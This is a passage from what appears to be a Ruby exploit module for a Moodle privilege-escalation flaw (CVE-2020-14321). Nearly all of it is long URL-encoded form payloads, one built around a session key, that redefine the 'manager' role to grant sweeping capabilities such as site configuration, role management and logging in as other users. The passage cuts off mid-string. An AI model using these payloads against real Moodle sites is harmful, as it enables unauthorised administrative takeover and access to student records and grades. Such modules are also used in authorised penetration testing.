restore%3Arolldates=0&moodle%2Frestore%3Arolldates=1&moodle%2Frestore%3Auploadfile=0&moodle%2Frestore%3Auploadfile=1&moodle%2Frestore%3Auserinfo=0&moodle%2Frestore%3Auserinfo=1&moodle%2Frestore%3Aviewautomatedfilearea=0&moodle%2Frestore%3Aviewautomatedfilearea=1&moodle%2Frole%3Aassign=0&moodle%2Frole%3Aassign=1&moodle%2Frole%3Aoverride=0&moodle%2Frole%3Aoverride=1&moodle%2Frole%3Areview=0&moodle%2Frole%3Areview=1&moodle%2Frole%3Asafeoverride=0&moodle%2Frole%3Aswitchroles=0&moodle%2Frole%3Aswitchroles=1&moodle%2Fsite%3Aviewreports=0&moodle%2Fsite%3Aviewreports=1&moodle%2Fuser%3Aloginas=0&moodle%2Fuser%3Aloginas=1&moodle%2Fuser%3Aviewdetails=0&moodle%2Fuser%3Aviewdetails=1&moodle%2Fuser%3Aviewhiddendetails=0&moodle%2Fuser%3Aviewhiddendetails=1&report%2Fcompletion%3Aview=0&report%2Fcompletion%3Aview=1&report%2Flog%3Aview=0&report%2Flog%3Aview=1&report%2Flog%3Aviewtoday=0&report%2Flog%3Aviewtoday=1&report%2Floglive%3Aview=0&report%2Floglive%3Aview=1&report%2Foutline%3Aview=0&report%2Foutline%3Aview=1&report%2Foutline%3Aviewuserreport=0&report%2Foutline%3Aviewuserreport=1&report%2Fparticipation%3Aview=0&report%2Fparticipation%3Aview=1&report%2Fprogress%3Aview=0&report%2Fprogress%3Aview=1&report%2Fstats%3Aview=0&report%2Fstats%3Aview=1&repository%2Fcontentbank%3Aaccesscoursecontent=0&repository%2Fcontentbank%3Aaccesscoursecontent=1&tool%2Fmonitor%3Amanagerules=0&tool%2Fmonitor%3Amanagerules=1&tool%2Fmonitor%3Asubscribe=0&tool%2Fmonitor%3Asubscribe=1&tool%2Frecyclebin%3Adeleteitems=0&tool%2Frecyclebin%3Adeleteitems=1&tool%2Frecyclebin%3Arestoreitems=0&tool%2Frecyclebin%3Arestoreitems=1&tool%2Frecyclebin%3Aviewitems=0&tool%2Frecyclebin%3Aviewitems=1&webservice%2Frest%3Ause=0&webservice%2Fsoap%3Ause=0&webservice%2Fxmlrpc%3Ause=0&atto%2Fh5p%3Aaddembed=0&atto%2Frecordrtc%3Arecordaudio=0&atto%2Frecordrtc%3Arecordvideo=0&booktool%2Fexportimscp%3Aexport=0&booktool%2Fimporthtml%3Aimport=0&booktool%2Fimporthtml%3Aimport=1&booktool%2Fprint%3Aprint=0&booktool%2Fprint%3Aprint=1&forumreport%2Fsummary%3Aview=0&forumreport%2Fsummary%3Aview=1&forumreport%2Fsummary%3Aviewall=0&forumreport%2Fsummary%3Aviewall=1&mod%2Fassign%3Aeditothersubmission=0&mod%2Fassign%3Aexportownsubmission=0&mod%2Fassign%3Aexportownsubmission=1&mod%2Fassign%3Agrade=0&mod%2Fassign%3Agrade=1&mod%2Fassign%3Agrantextension=0&mod%2Fassign%3Agrantextension=1&mod%2Fassign%3Amanageallocations=0&mod%2Fassign%3Amanageallocations=1&mod%2Fassign%3Amanagegrades=0&mod%2Fassign%3Amanagegrades=1&mod%2Fassign%3Amanageoverrides=0&mod%2Fassign%3Amanageoverrides=1&mod%2Fassign%3Areceivegradernotifications=0&mod%2Fassign%3Areceivegradernotifications=1&mod%2Fassign%3Areleasegrades=0&mod%2Fassign%3Areleasegrades=1&mod%2Fassign%3Arevealidentities=0&mod%2Fassign%3Arevealidentities=1&mod%2Fassign%3Areviewgrades=0&mod%2Fassign%3Areviewgrades=1&mod%2Fassign%3Ashowhiddengrader=0&mod%2Fassign%3Ashowhiddengrader=1&mod%2Fassign%3Asubmit=0&mod%2Fassign%3Aview=0&mod%2Fassign%3Aview=1&mod%2Fassign%3Aviewblinddetails=0&mod%2Fassign%3Aviewblinddetails=1&mod%2Fassign%3Aviewgrades=0&mod%2Fassign%3Aviewgrades=1&mod%2Fassignment%3Aexportownsubmission=0&mod%2Fassignment%3Aexportownsubmission=1&mod%2Fassignment%3Agrade=0&mod%2Fassignment%3Agrade=1&mod%2Fassignment%3Asubmit=0&mod%2Fassignment%3Aview=0&mod%2Fassignment%3Aview=1&mod%2Fbook%3Aedit=0&mod%2Fbook%3Aedit=1&mod%2Fbook%3Aread=0&mod%2Fbook%3Aread=1&mod%2Fbook%3Aviewhiddenchapters=0&mod%2Fbook%3Aviewhiddenchapters=1&mod%2Fchat%3Achat=0&mod%2Fchat%3Achat=1&mod%2Fchat%3Adeletelog=0&mod%2Fchat%3Adeletelog=1&mod%2Fchat%3Aexportparticipatedsession=0&mod%2Fchat%3Aexportparticipatedsession=1&mod%2Fchat%3Aexportsession=0&mod%2Fchat%3Aexportsession=1&mod%2Fchat%3Areadlog=0&mod%2Fchat%3Areadlog=1&mod%2Fchat%3Aview=0&mod%2Fchoice%3Achoose=0&mod%2Fchoice%3Adeleteresponses=0&mod%2Fchoice%3Adeleteresponses=1&mod%2Fchoice%3Adownloadresponses=0&mod%2Fchoice%3Adownloadresponses=1&mod%2Fchoice%3Areadresponses=0&mod%2Fchoice%3Areadresponses=1&mod%2Fchoice%3Aview=0&mod%2Fdata%3Aapprove=0&mod%2Fdata%3Aapprove=1&mod%2Fdata%3Acomment=0&mod%2Fdata%3Acomment=1&mod%2Fdata%3Aexportallentries=0&mod%2Fdata%3Aexportallentries=1&mod%2Fdata%3Aexportentry=0&mod%2Fdata%3Aexportentry=1&mod%2Fdata%3Aexportownentry=0&mod%2Fdata%3Aexportownentry=1&mod%2Fdata%3Aexportuserinfo=0&mod%2Fdata%3Aexportuserinfo=1&mod%2Fdata%3Amanagecomments=0&mod%2Fdata%3Amanagecomments=1&mod%2Fdata%3Amanageentries=0&mod%2Fdata%3Amanageentries=1&mod%2Fdata%3Amanagetemplates=0&mod%2Fdata%3Amanagetemplates=1&mod%2Fdata%3Amanageuserpresets=0&mod%2Fdata%3Amanageuserpresets=1&mod%2Fdata%3Arate=0&mod%2Fdata%3Arate=1&mod%2Fdata%3Aview=0&mod%2Fdata%3Aview=1&mod%2Fdata%3Aviewallratings=0&mod%2Fdata%3Aviewallratings=1&mod%2Fdata%3Aviewalluserpresets=0&mod%2Fdata%3Aviewalluserpresets=1&mod%2Fdata%3Aviewanyrating=0&mod%2Fdata%3Aviewanyrating=1&mod%2Fdata%3Aviewentry=0&mod%2Fdata%3Aviewentry=1&mod%2Fdata%3Aviewrating=0&mod%2Fdata%3Aviewrating=1&mod%2Fdata%3Awriteentry=0&mod%2Fdata%3Awriteentry=1&mod%2Ffeedback%3Acomplete=0&mod%2Ffeedback%3Acreateprivatetemplate=0&mod%2Ffeedback%3Acreateprivatetemplate=1&mod%2Ffeedback%3Acreatepublictemplate=0&mod%2Ffeedback%3Acreatepublictemplate=1&mod%2Ffeedback%3Adeletesubmissions=0&mod%2Ffeedback%3Adeletesubmissions=1&mod%2Ffeedback%3Adeletetemplate=0&mod%2Ffeedback%3Adeletetemplate=1&mod%2Ffeedback%3Aedititems=0&mod%2Ffeedback%3Aedititems=1&mod%2Ffeedback%3Amapcourse=0&mod%2Ffeedback%3Amapcourse=1&mod%2Ffeedback%3Areceivemail=0&mod%2Ffeedback%3Aview=0&mod%2Ffeedback%3Aview=1&mod%2Ffeedback%3Aviewanalysepage=0&mod%2Ffeedback%3Aviewanalysepage=1&mod%2Ffeedback%3Aviewreports=0&mod%2Ffeedback%3Aviewreports=1&mod%2Ffolder%3Amanagefiles=0&mod%2Ffolder%3Aview=0&mod%2Fforum%3Aaddnews=0&mod%2Fforum%3Aaddnews=1&mod%2Fforum%3Aaddquestion=0&mod%2Fforum%3Aaddquestion=1&mod%2Fforum%3Aallowforcesubscribe=0&mod%2Fforum%3Acanoverridecutoff=0&mod%2Fforum%3Acanoverridecutoff=1&mod%2Fforum%3Acanoverridediscussionlock=0&mod%2Fforum%3Acanoverridediscussionlock=1&mod%2Fforum%3Acanposttomygroups=0&mod%2Fforum%3Acanposttomygroups=1&mod%2Fforum%3Acantogglefavourite=0&mod%2Fforum%3Acreateattachment=0&mod%2Fforum%3Acreateattachment=1&mod%2Fforum%3Adeleteanypost=0&mod%2Fforum%3Adeleteanypost=1&mod%2Fforum%3Adeleteownpost=0&mod%2Fforum%3Adeleteownpost=1&mod%2Fforum%3Aeditanypost=0&mod%2Fforum%3Aeditanypost=1&mod%2Fforum%3Aexportdiscussion=0&mod%2Fforum%3Aexportdiscussion=1&mod%2Fforum%3Aexportforum=0&mod%2Fforum%3Aexportforum=1&mod%2Fforum%3Aexportownpost=0&mod%2Fforum%3Aexportownpost=1&mod%2Fforum%3Aexportpost=0&mod%2Fforum%3Aexportpost=1&mod%2Fforum%3Agrade=0&mod%2Fforum%3Agrade=1&mod%2Fforum%3Amanagesubscriptions=0&mod%2Fforum%3Amanagesubscriptions=1&mod%2Fforum%3Amovediscussions=0&mod%2Fforum%3Amovediscussions=1&mod%2Fforum%3Apindiscussions=0&mod%2Fforum%3Apindiscussions=1&mod%2Fforum%3Apostprivatereply=0&mod%2Fforum%3Apostprivatereply=1&mod%2Fforum%3Apostwithoutthrottling=0&mod%2Fforum%3Apostwithoutthrottling=1&mod%2Fforum%3Arate=0&mod%2Fforum%3Arate=1&mod%2Fforum%3Areadprivatereplies=0&mod%2Fforum%3Areadprivatereplies=1&mod%2Fforum%3Areplynews=0&mod%2Fforum%3Areplynews=1&mod%2Fforum%3Areplypost=0&mod%2Fforum%3Areplypost=1&mod%2Fforum%3Asplitdiscussions=0&mod%2Fforum%3Asplitdiscussions=1&mod%2Fforum%3Astartdiscussion=0&mod%2Fforum%3Astartdiscussion=1&mod%2Fforum%3Aviewallratings=0&mod%2Fforum%3Aviewallratings=1&mod%2Fforum%3Aviewanyrating=0&mod%2Fforum%3Aviewanyrating=1&mod%2Fforum%3Aviewdiscussion=0&mod%2Fforum%3Aviewdiscussion=1&mod%2Fforum%3Aviewhiddentimedposts=0&mod%2Fforum%3Aviewhiddentimedposts=1&mod%2Fforum%3Aviewqandawithoutposting=0&mod%2Fforum%3Aviewqandawithoutposting=1&mod%2Fforum%3Aviewrating=0&mod%2Fforum%3Aviewrating=1&mod%2Fforum%3Aviewsubscribers=0&mod%2Fforum%3Aviewsubscribers=1&mod%2Fglossary%3Aapprove=0&mod%2Fglossary%3Aapprove=1&mod%2Fglossary%3Acomment=0&mod%2Fglossary%3Acomment=1&mod%2Fglossary%3Aexport=0&mod%2Fglossary%3Aexport=1&mod%2Fglossary%3Aexportentry=0&mod%2Fglossary%3Aexportentry=1&mod%2Fglossary%3Aexportownentry=0&mod%2Fglossary%3Aexportownentry=1&mod%2Fglossary%3Aimport=0&mod%2Fglossary%3Aimport=1&mod%2Fglossary%3Amanagecategories=0&mod%2Fglossary%3Amanagecategories=1&mod%2Fglossary%3Amanagecomments=0&mod%2Fglossary%3Amanagecomments=1&mod%2Fglossary%3Amanageentries=0&mod%2Fglossary%3Amanageentries=1&mod%2Fglossary%3Arate=0&mod%2Fglossary%3Arate=1&mod%2Fglossary%3Aview=0&mod%2Fglossary%3Aview=1&mod%2Fglossary%3Aviewallratings=0&mod%2Fglossary%3Aviewallratings=1&mod%2Fglossary%3Aviewanyrating=0&mod%2Fglossary%3Aviewanyrating=1&mod%2Fglossary%3Aviewrating=0&mod%2Fglossary%3Aviewrating=1&mod%2Fglossary%3Awrite=0&mod%2Fglossary%3Awrite=1&mod%2Fh5pactivity%3Areviewattempts=0&mod%2Fh5pactivity%3Areviewattempts=1&mod%2Fh5pactivity%3Asubmit=0&mod%2Fh5pactivity%3Aview=0&mod%2Fh5pactivity%3Aview=1&mod%2Fimscp%3Aview=0&mod%2Flabel%3Aview=0&mod%2Flesson%3Aedit=0&mod%2Flesson%3Aedit=1&mod%2Flesson%3Agrade=0&mod%2Flesson%3Agrade=1&mod%2Flesson%3Amanage=0&mod%2Flesson%3Amanage=1&mod%2Flesson%3Amanageoverrides=0&mod%2Flesson%3Amanageoverrides=1&mod%2Flesson%3Aview=0&mod%2Flesson%3Aviewreports=0&mod%2Flesson%3Aviewreports=1&mod%2Flti%3Aadmin=0&mod%2Flti%3Amanage=0&mod%2Flti%3Amanage=1&mod%2Flti%3Aview=0&mod%2Flti%3Aview=1&mod%2Fpage%3Aview=0&mod%2Fquiz%3Aattempt=0&mod%2Fquiz%3Adeleteattempts=0&mod%2Fquiz%3Adeleteattempts=1&mod%2Fquiz%3Aemailconfirmsubmission=0&mod%2Fquiz%3Aemailnotifysubmission=0&mod%2Fquiz%3Aemailwarnoverdue=0&mod%2Fquiz%3Agrade=0&mod%2Fquiz%3Agrade=1&mod%2Fquiz%3Aignoretimelimits=0&mod%2Fquiz%3Amanage=0&mod%2Fquiz%3Amanage=1&mod%2Fquiz%3Amanageoverrides=0&mod%2Fquiz%3Amanageoverrides=1&mod%2Fquiz%3Apreview=0&mod%2Fquiz%3Apreview=1&mod%2Fquiz%3Aregrade=0&mod%2Fquiz%3Aregrade=1&mod%2Fquiz%3Areviewmyattempts=0&mod%2Fquiz%3Aview=0&mod%2Fquiz%3Aview=1&mod%2Fquiz%3Aviewreports=0&mod%2Fquiz%3Aviewreports=1&mod%2Fresource%3Aview=0&mod%2Fscorm%3Adeleteownresponses=0&mod%2Fscorm%3Adeleteresponses=0&mod%2Fscorm%3Adeleteresponses=1&mod%2Fscorm%3Asavetrack=0&mod%2Fscorm%3Asavetrack=1&mod%2Fscorm%3Askipview=0&mod%2Fscorm%3Aviewreport=0&mod%2Fscorm%3Aviewreport=1&mod%2Fscorm%3Aviewscores=0&mod%2Fscorm%3Aviewscores=1&mod%2Fsurvey%3Adownload=0&mod%2Fsurvey%3Adownload=1&mod%2Fsurvey%3Aparticipate=0&mod%2Fsurvey%3Aparticipate=1&mod%2Fsurvey%3Areadresponses=0&mod%2Fsurvey%3Areadresponses=1&mod%2Furl%3Aview=0&mod%2Fwiki%3Acreatepage=0&mod%2Fwiki%3Acreatepage=1&mod%2Fwiki%3Aeditcomment=0&mod%2Fwiki%3Aeditcomment=1&mod%2Fwiki%3Aeditpage=0&mod%2Fwiki%3Aeditpage=1&mod%2Fwiki%3Amanagecomment=0&mod%2Fwiki%3Amanagecomment=1&mod%2Fwiki%3Amanagefiles=0&mod%2Fwiki%3Amanagefiles=1&mod%2Fwiki%3Amanagewiki=0&mod%2Fwiki%3Amanagewiki=1&mod%2Fwiki%3Aoverridelock=0&mod%2Fwiki%3Aoverridelock=1&mod%2Fwiki%3Aviewcomment=0&mod%2Fwiki%3Aviewcomment=1&mod%2Fwiki%3Aviewpage=0&mod%2Fwiki%3Aviewpage=1&mod%2Fworkshop%3Aallocate=0&mod%2Fworkshop%3Aallocate=1&mod%2Fworkshop%3Adeletesubmissions=0&mod%2Fworkshop%3Adeletesubmissions=1&mod%2Fworkshop%3Aeditdimensions=0&mod%2Fworkshop%3Aeditdimensions=1&mod%2Fworkshop%3Aexportsubmissions=0&mod%2Fworkshop%3Aexportsubmissions=1&mod%2Fworkshop%3Aignoredeadlines=0&mod%2Fworkshop%3Aignoredeadlines=1&mod%2Fworkshop%3Amanageexamples=0&mod%2Fworkshop%3Amanageexamples=1&mod%2Fworkshop%3Aoverridegrades=0&mod%2Fworkshop%3Aoverridegrades=1&mod%2Fworkshop%3Apeerassess=0&mod%2Fworkshop%3Apublishsubmissions=0&mod%2Fworkshop%3Apublishsubmissions=1&mod%2Fworkshop%3Asubmit=0&mod%2Fworkshop%3Aswitchphase=0&mod%2Fworkshop%3Aswitchphase=1&mod%2Fworkshop%3Aview=0&mod%2Fworkshop%3Aview=1&mod%2Fworkshop%3Aviewallassessments=0&mod%2Fworkshop%3Aviewallassessments=1&mod%2Fworkshop%3Aviewallsubmissions=0&mod%2Fworkshop%3Aviewallsubmissions=1&mod%2Fworkshop%3Aviewauthornames=0&mod%2Fworkshop%3Aviewauthornames=1&mod%2Fworkshop%3Aviewauthorpublished=0&mod%2Fworkshop%3Aviewauthorpublished=1&mod%2Fworkshop%3Aviewpublishedsubmissions=0&mod%2Fworkshop%3Aviewpublishedsubmissions=1&mod%2Fworkshop%3Aviewreviewernames=0&mod%2Fworkshop%3Aviewreviewernames=1&moodle%2Fbackup%3Abackupactivity=0&moodle%2Fbackup%3Abackupactivity=1&moodle%2Fcompetency%3Acoursecompetencyconfigure=0&moodle%2Fcompetency%3Acoursecompetencyconfigure=1&moodle%2Fcourse%3Aactivityvisibility=0&moodle%2Fcourse%3Aactivityvisibility=1&moodle%2Fcourse%3Aignoreavailabilityrestrictions=0&moodle%2Fcourse%3Aignoreavailabilityrestrictions=1&moodle%2Fcourse%3Amanageactivities=0&moodle%2Fcourse%3Amanageactivities=1&moodle%2Fcourse%3Atogglecompletion=0&moodle%2Fcourse%3Aviewhiddenactivities=0&moodle%2Fcourse%3Aviewhiddenactivities=1&moodle%2Fh5p%3Adeploy=0&moodle%2Fh5p%3Adeploy=1&moodle%2Fh5p%3Asetdisplayoptions=0&moodle%2Fh5p%3Aupdatelibraries=0&moodle%2Fh5p%3Aupdatelibraries=1&moodle%2Fsite%3Aaccessallgroups=0&moodle%2Fsite%3Aaccessallgroups=1&moodle%2Fsite%3Amanagecontextlocks=0&moodle%2Fsite%3Atrustcontent=0&moodle%2Fsite%3Atrustcontent=1&moodle%2Fsite%3Aviewanonymousevents=0&moodle%2Fsite%3Aviewanonymousevents=1&moodle%2Fsite%3Aviewfullnames=0&moodle%2Fsite%3Aviewfullnames=1&moodle%2Fsite%3Aviewuseridentity=0&moodle%2Fsite%3Aviewuseridentity=1&quiz%2Fgrading%3Aviewidnumber=0&quiz%2Fgrading%3Aviewstudentnames=0&quiz%2Fstatistics%3Aview=0&quiz%2Fstatistics%3Aview=1&quizaccess%2Fseb%3Abypassseb=0&quizaccess%2Fseb%3Abypassseb=1&quizaccess%2Fseb%3Amanage_filemanager_sebconfigfile=0&quizaccess%2Fseb%3Amanage_filemanager_sebconfigfile=1&quizaccess%2Fseb%3Amanage_seb_activateurlfiltering=0&quizaccess%2Fseb%3Amanage_seb_activateurlfiltering=1&quizaccess%2Fseb%3Amanage_seb_allowedbrowserexamkeys=0&quizaccess%2Fseb%3Amanage_seb_allowedbrowserexamkeys=1&quizaccess%2Fseb%3Amanage_seb_allowreloadinexam=0&quizaccess%2Fseb%3Amanage_seb_allowreloadinexam=1&quizaccess%2Fseb%3Amanage_seb_allowspellchecking=0&quizaccess%2Fseb%3Amanage_seb_allowspellchecking=1&quizaccess%2Fseb%3Amanage_seb_allowuserquitseb=0&quizaccess%2Fseb%3Amanage_seb_allowuserquitseb=1&quizaccess%2Fseb%3Amanage_seb_enableaudiocontrol=0&quizaccess%2Fseb%3Amanage_seb_enableaudiocontrol=1&quizaccess%2Fseb%3Amanage_seb_expressionsallowed=0&quizaccess%2Fseb%3Amanage_seb_expressionsallowed=1&quizaccess%2Fseb%3Amanage_seb_expressionsblocked=0&quizaccess%2Fseb%3Amanage_seb_expressionsblocked=1&quizaccess%2Fseb%3Amanage_seb_filterembeddedcontent=0&quizaccess%2Fseb%3Amanage_seb_filterembeddedcontent=1&quizaccess%2Fseb%3Amanage_seb_linkquitseb=0&quizaccess%2Fseb%3Amanage_seb_linkquitseb=1&quizaccess%2Fseb%3Amanage_seb_muteonstartup=0&quizaccess%2Fseb%3Amanage_seb_muteonstartup=1&quizaccess%2Fseb%3Amanage_seb_quitpassword=0&quizaccess%2Fseb%3Amanage_seb_quitpassword=1&quizaccess%2Fseb%3Amanage_seb_regexallowed=0&quizaccess%2Fseb%3Amanage_seb_regexallowed=1&quizaccess%2Fseb%3Amanage_seb_regexblocked=0&quizaccess%2Fseb%3Amanage_seb_regexblocked=1&quizaccess%2Fseb%3Amanage_seb_requiresafeexambrowser=0&quizaccess%2Fseb%3Amanage_seb_requiresafeexambrowser=1&quizaccess%2Fseb%3Amanage_seb_showkeyboardlayout=0&quizaccess%2Fseb%3Amanage_seb_showkeyboardlayout=1&quizaccess%2Fseb%3Amanage_seb_showreloadbutton=0&quizaccess%2Fseb%3Amanage_seb_showreloadbutton=1&quizaccess%2Fseb%3Amanage_seb_showsebdownloadlink=0&quizaccess%2Fseb%3Amanage_seb_showsebdownloadlink=1&quizaccess%2Fseb%3Amanage_seb_showsebtaskbar=0&quizaccess%2Fseb%3Amanage_seb_showsebtaskbar=1&quizaccess%2Fseb%3Amanage_seb_showtime=0&quizaccess%2Fseb%3Amanage_seb_showtime=1&quizaccess%2Fseb%3Amanage_seb_showwificontrol=0&quizaccess%2Fseb%3Amanage_seb_showwificontrol=1&quizaccess%2Fseb%3Amanage_seb_templateid=0&quizaccess%2Fseb%3Amanage_seb_templateid=1&quizaccess%2Fseb%3Amanage_seb_userconfirmquit=0&quizaccess%2Fseb%3Amanage_seb_userconfirmquit=1&repository%2Fareafiles%3Aview=0&repository%2Fboxnet%3Aview=0&repository%2Fcontentbank%3Aview=0&repository%2Fcontentbank%3Aview=1&repository%2Fcoursefiles%3Aview=0&repository%2Fcoursefiles%3Aview=1&repository%2Fdropbox%3Aview=0&repository%2Fequella%3Aview=0&repository%2Ffilesystem%3Aview=0&repository%2Ffilesystem%3Aview=1&repository%2Fflickr%3Aview=0&repository%2Fflickr_public%3Aview=0&repository%2Fgoogledocs%3Aview=0&repository%2Flocal%3Aview=0&repository%2Flocal%3Aview=1&repository%2Fmerlot%3Aview=0&repository%2Fnextcloud%3Aview=0&repository%2Fonedrive%3Aview=0&repository%2Fpicasa%3Aview=0&repository%2Frecent%3Aview=0&repository%2Fs3%3Aview=0&repository%2Fskydrive%3Aview=0&repository%2Fupload%3Aview=0&repository%2Furl%3Aview=0&repository%2Fuser%3Aview=0&repository%2Fwebdav%3Aview=0&repository%2Fwebdav%3Aview=1&repository%2Fwikimedia%3Aview=0&repository%2Fyoutube%3Aview=0&block%2Factivity_modules%3Aaddinstance=0&block%2Factivity_modules%3Aaddinstance=1&block%2Factivity_results%3Aaddinstance=0&block%2Factivity_results%3Aaddinstance=1&block%2Fadmin_bookmarks%3Aaddinstance=0&block%2Fadmin_bookmarks%3Aaddinstance=1&block%2Fbadges%3Aaddinstance=0&block%2Fbadges%3Aaddinstance=1&block%2Fblog_menu%3Aaddinstance=0&block%2Fblog_menu%3Aaddinstance=1&block%2Fblog_recent%3Aaddinstance=0&block%2Fblog_recent%3Aaddinstance=1&block%2Fblog_tags%3Aaddinstance=0&block%2Fblog_tags%3Aaddinstance=1&block%2Fcalendar_month%3Aaddinstance=0&block%2Fcalendar_month%3Aaddinstance=1&block%2Fcalendar_upcoming%3Aaddinstance=0&block%2Fcalendar_upcoming%3Aaddinstance=1&block%2Fcomments%3Aaddinstance=0&block%2Fcomments%3Aaddinstance=1&block%2Fcompletionstatus%3Aaddinstance=0&block%2Fcompletionstatus%3Aaddinstance=1&block%2Fcourse_list%3Aaddinstance=0&block%2Fcourse_list%3Aaddinstance=1&block%2Fcourse_summary%3Aaddinstance=0&block%2Fcourse_summary%3Aaddinstance=1&block%2Ffeedback%3Aaddinstance=0&block%2Ffeedback%3Aaddinstance=1&block%2Fglobalsearch%3Aaddinstance=0&block%2Fglobalsearch%3Aaddinstance=1&block%2Fglossary_random%3Aaddinstance=0&block%2Fglossary_random%3Aaddinstance=1&block%2Fhtml%3Aaddinstance=0&block%2Fhtml%3Aaddinstance=1&block%2Flogin%3Aaddinstance=0&block%2Flogin%3Aaddinstance=1&block%2Fmentees%3Aaddinstance=0&block%2Fmentees%3Aaddinstance=1&block%2Fmnet_hosts%3Aaddinstance=0&block%2Fmnet_hosts%3Aaddinstance=1&block%2Fmyprofile%3Aaddinstance=0&block%2Fmyprofile%3Aaddinstance=1&block%2Fnavigation%3Aaddinstance=0&block%2Fnavigation%3Aaddinstance=1&block%2Fnews_items%3Aaddinstance=0&block%2Fnews_items%3Aaddinstance=1&block%2Fonline_users%3Aaddinstance=0&block%2Fonline_users%3Aaddinstance=1&block%2Fonline_users%3Aviewlist=0&block%2Fonline_users%3Aviewlist=1&block%2Fprivate_files%3Aaddinstance=0&block%2Fprivate_files%3Aaddinstance=1&block%2Fquiz_results%3Aaddinstance=0&block%2Fquiz_results%3Aaddinstance=1&block%2Frecent_activity%3Aaddinstance=0&block%2Frecent_activity%3Aaddinstance=1&block%2Frss_client%3Aaddinstance=0&block%2Frss_client%3Aaddinstance=1&block%2Frss_client%3Amanageanyfeeds=0&block%2Frss_client%3Amanageanyfeeds=1&block%2Frss_client%3Amanageownfeeds=0&block%2Frss_client%3Amanageownfeeds=1&block%2Fsearch_forums%3Aaddinstance=0&block%2Fsearch_forums%3Aaddinstance=1&block%2Fsection_links%3Aaddinstance=0&block%2Fsection_links%3Aaddinstance=1&block%2Fselfcompletion%3Aaddinstance=0&block%2Fselfcompletion%3Aaddinstance=1&block%2Fsettings%3Aaddinstance=0&block%2Fsettings%3Aaddinstance=1&block%2Fsite_main_menu%3Aaddinstance=0&block%2Fsite_main_menu%3Aaddinstance=1&block%2Fsocial_activities%3Aaddinstance=0&block%2Fsocial_activities%3Aaddinstance=1&block%2Ftag_flickr%3Aaddinstance=0&block%2Ftag_flickr%3Aaddinstance=1&block%2Ftag_youtube%3Aaddinstance=0&block%2Ftag_youtube%3Aaddinstance=1&block%2Ftags%3Aaddinstance=0&block%2Ftags%3Aaddinstance=1&moodle%2Fblock%3Aedit=0&moodle%2Fblock%3Aedit=1&moodle%2Fblock%3Aview=0&moodle%2Fsite%3Amanageblocks=0&moodle%2Fsite%3Amanageblocks=1"
  end

  def manager_all_permissions(sess_key)
    # https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions
    # or
    # https://github.com/HoangKien1020/CVE-2020-14321/blob/master/cve202014321.py#L113
    # im sorry to anyone who has to read this.
    "sesskey=#{sess_key}&return=define&resettype=none&savechanges=Save+changes&shortname=manager&name=&description=&archetype=manager&contextlevel10=0&contextlevel10=1&contextlevel30=0&contextlevel30=1&contextlevel40=0&contextlevel40=1&contextlevel50=0&contextlevel50=1&contextlevel70=0&contextlevel70=1&contextlevel80=0&contextlevel80=1&allowassign%5B%5D=&allowassign%5B%5D=1&allowassign%5B%5D=2&allowassign%5B%5D=3&allowassign%5B%5D=4&allowassign%5B%5D=5&allowassign%5B%5D=6&allowassign%5B%5D=7&allowassign%5B%5D=8&allowoverride%5B%5D=&allowoverride%5B%5D=1&allowoverride%5B%5D=2&allowoverride%5B%5D=3&allowoverride%5B%5D=4&allowoverride%5B%5D=5&allowoverride%5B%5D=6&allowoverride%5B%5D=7&allowoverride%5B%5D=8&allowswitch%5B%5D=&allowswitch%5B%5D=1&allowswitch%5B%5D=2&allowswitch%5B%5D=3&allowswitch%5B%5D=4&allowswitch%5B%5D=5&allowswitch%5B%5D=6&allowswitch%5B%5D=7&allowswitch%5B%5D=8&allowview%5B%5D=&allowview%5B%5D=1&allowview%5B%5D=2&allowview%5B%5D=3&allowview%5B%5D=4&allowview%5B%5D=5&allowview%5B%5D=6&allowview%5B%5D=7&allowview%5B%5D=8&block%2Fadmin_bookmarks%3Amyaddinstance=1&block%2Fbadges%3Amyaddinstance=1&block%2Fcalendar_month%3Amyaddinstance=1&block%2Fcalendar_upcoming%3Amyaddinstance=1&block%2Fcomments%3Amyaddinstance=1&block%2Fcourse_list%3Amyaddinstance=1&block%2Fglobalsearch%3Amyaddinstance=1&block%2Fglossary_random%3Amyaddinstance=1&block%2Fhtml%3Amyaddinstance=1&block%2Flp%3Aaddinstance=1&block%2Flp%3Amyaddinstance=1&block%2Fmentees%3Amyaddinstance=1&block%2Fmnet_hosts%3Amyaddinstance=1&block%2Fmyoverview%3Amyaddinstance=1&block%2Fmyprofile%3Amyaddinstance=1&block%2Fnavigation%3Amyaddinstance=1&block%2Fnews_items%3Amyaddinstance=1&block%2Fonline_users%3Amyaddinstance=1&block%2Fprivate_files%3Amyaddinstance=1&block%2Frecentlyaccessedcourses%3Amyaddinstance=1&block%2Frecentlyaccesseditems%3Amyaddinstance=1&block%2Frss_client%3Amyaddinstance=1&block%2Fsettings%3Amyaddinstance=1&block%2Fstarredcourses%3Amyaddinstance=1&block%2Ftags%3Amyaddinstance=1&block%2Ftimeline%3Amyaddinstance=1&enrol%2Fcategory%3Asynchronised=1&message%2Fairnotifier%3Amanagedevice=1&moodle%2Fanalytics%3Alistowninsights=1&moodle%2Fanalytics%3Amanagemodels=1&moodle%2Fbadges%3Amanageglobalsettings=1&moodle%2Fblog%3Acreate=1&moodle%2Fblog%3Amanageentries=1&moodle%2Fblog%3Amanageexternal=1&moodle%2Fblog%3Asearch=1&moodle%2Fblog%3Aview=1&moodle%2Fblog%3Aviewdrafts=1&moodle%2Fcourse%3Aconfigurecustomfields=1&moodle%2Fcourse%3Arecommendactivity=1&moodle%2Fgrade%3Amanagesharedforms=1&moodle%2Fgrade%3Asharegradingforms=1&moodle%2Fmy%3Aconfigsyspages=1&moodle%2Fmy%3Amanageblocks=1&moodle%2Fportfolio%3Aexport=1&moodle%2Fquestion%3Aconfig=1&moodle%2Frestore%3Acreateuser=1&moodle%2Frole%3Amanage=1&moodle%2Fsearch%3Aquery=1&moodle%2Fsite%3Aconfig=1&moodle%2Fsite%3Aconfigview=1&moodle%2Fsite%3Adeleteanymessage=1&moodle%2Fsite%3Adeleteownmessage=1&moodle%2Fsite%3Adoclinks=1&moodle%2Fsite%3Aforcelanguage=1&moodle%2Fsite%3Amaintenanceaccess=1&moodle%2Fsite%3Amanageallmessaging=1&moodle%2Fsite%3Amessageanyuser=1&moodle%2Fsite%3Amnetlogintoremote=1&moodle%2Fsite%3Areadallmessages=1&moodle%2Fsite%3Asendmessage=1&moodle%2Fsite%3Auploadusers=1&moodle%2Fsite%3Aviewparticipants=1&moodle%2Ftag%3Aedit=1&moodle%2Ftag%3Aeditblocks=1&moodle%2Ftag%3Aflag=1&moodl